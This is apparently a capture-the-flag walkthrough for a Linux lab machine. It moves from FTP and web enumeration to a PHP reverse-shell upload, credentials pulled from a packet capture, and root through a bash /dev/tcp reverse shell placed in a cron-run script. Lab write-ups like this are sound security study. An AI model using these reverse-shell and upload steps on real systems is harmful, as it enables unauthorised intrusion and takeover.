# NOTES:

### Goal: own root
### Information given: ip, not much else

#### Enumeration:
    - nmap:
    - open ports:
        - 21: ftp      vsftpd 3.0.3
            - anonymous login allowed
        - 22: ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
        - 80: http     Apache httpd 2.4.18 ((Ubuntu))
    - OS: linux kernel
    - nothing great to get from the website

#### identifying vulnerabilities:
    - ftp login didn't get much either other than amongus memes
    - possible user: Maya
    - the ftp fileshare is accessible from the http://<target_ip>/files folder
        - try to put a php webshell in there and run it in the browser


#### exploit:
    - ftp in as user ftp, no password
    - ftp folder is writable, so we can put pentestmonkey's php reverse shell there and load it through a web browser or curl
    - FOOTHOLD: got a terminal as www-data

##### cat /recipe.txt for the first flag

#### privilege escalation/lateral movement
    - etc/passwd lists a user named *lennie*
    - root folder has security incidents folder
    - in the /incidents/suspicious.pcapng
        - wireshark > tcp stream 7 > someone tried to use lennie's credentials to run sudo from www-data
    - credentials:
        - u: lennie
        - p: c4ntg3t3n0ughsp1c3
        - now I can ssh in as lennie

#### cat /home/lennie/user.txt for second flag

    - /home/lennie/scripts
        - lennie is able to run the planner.sh but doesn't have permission to change startup.txt or planner.sh
        - planner.sh just dumps an environment variable into startup.txt and then runs /etc/print.sh
        - lennie owns print.sh

    - sudo -l:
        - lennie isn't in sudoers

    - edited print.sh to add in a reverse shell in case root runs planner.sh periodically
        - bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
        - I caught it with netcat and got a root terminal!!

##### cat /root/root.txt for the third flag
